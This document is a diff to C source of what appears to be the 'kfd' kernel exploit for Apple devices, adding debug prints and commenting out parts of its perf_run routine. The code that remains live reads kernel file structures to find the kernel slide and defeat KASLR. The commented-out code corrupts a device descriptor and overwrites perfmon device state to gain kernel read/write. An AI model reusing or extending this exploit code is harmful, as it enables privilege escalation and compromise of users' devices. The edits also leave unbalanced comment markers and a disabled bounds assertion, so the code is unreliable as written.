@@ -85,22 +85,35 @@ void perf_init(struct kfd* kfd)
 
 void perf_run(struct kfd* kfd)
 {
+    printf("assert for proc\n");
     assert(kfd->info.kaddr.current_proc);
+    printf("get fd_ofiles\n");
     u64 fd_ofiles = kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
+    printf("get fileproc_kaddr\n");
     u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
+    printf("get fileproc\n");
     u64 fileproc = 0;
+    printf("kread fileproc_kaddr, &fileproc, sizeof(fileproc)\n");
     kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
+    printf("get fb_glob_kaddr\n");
     u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
+    printf("get fb_glob\n");
     u64 fp_glob = 0;
+    printf("kread fp_glob_kaddr, &fp_glob, sizeof(fp_glob)\n");
     kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
+    printf("get fg_ops\n");
     u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
+    printf("get fo_kqfilter\n");
     u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
+    printf("get true vn_kqfilter\n");
     u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
+    printf("get kernel_slide\n");
     u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
     u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
     kfd->perf.kernel_slide = kernel_slide;
     print_x64(kfd->perf.kernel_slide);
-
+    
+    /*
     if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
         u32 mh_header[2] = {};
         mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
@@ -108,10 +121,12 @@ void perf_run(struct kfd* kfd)
         assert(mh_header[0] == 0xfeedfacf);
         assert(mh_header[1] == 0x0100000c);
     }
-
+    
+     
     /*
      * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
      */
+    /*
     u64 fg_data = kget_u64(fileglob__fg_data, unsign_kaddr(fp_glob));
     u64 v_specinfo = kget_u64(vnode__v_un__vu_specinfo, unsign_kaddr(fg_data));
     kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + kfd_offset(specinfo__si_rdev);
@@ -130,7 +145,7 @@ void perf_run(struct kfd* kfd)
             break;
         }
     }
-
+    
     u32 new_si_rdev_buffer[2] = {};
     new_si_rdev_buffer[0] = dev_new_major;
     new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
@@ -139,6 +154,7 @@ void perf_run(struct kfd* kfd)
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
+    /*
     u64 ptov_table_kaddr = kfd_offset(kernelcache__ptov_table) + kernel_slide;
     kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));
 
@@ -167,6 +183,7 @@ void perf_run(struct kfd* kfd)
     /*
      * Find the shared page in kernel space.
      */
+    /*
     kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
     kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);
 
@@ -175,6 +192,7 @@ void perf_run(struct kfd* kfd)
      * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
      * - perfmon_devices[0][0].pmdv_allocated = true
      */
+    /*
     struct perfmon_device perfmon_device = {};
     u64 perfmon_device_kaddr = kfd_offset(kernelcache__perfmon_devices) + kernel_slide;
     u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
@@ -196,6 +214,7 @@ void perf_run(struct kfd* kfd)
     kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
     kfd->kread.krkw_method_ops.kread = perf_kread;
     kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
+    */
 }
 
 void perf_free(struct kfd* kfd)
@@ -231,7 +250,7 @@ u64 phystokv(struct kfd* kfd, u64 pa)
         }
     }
 
-    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
+//    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
     return pa - gPhysBase + gVirtBase;
 }
 
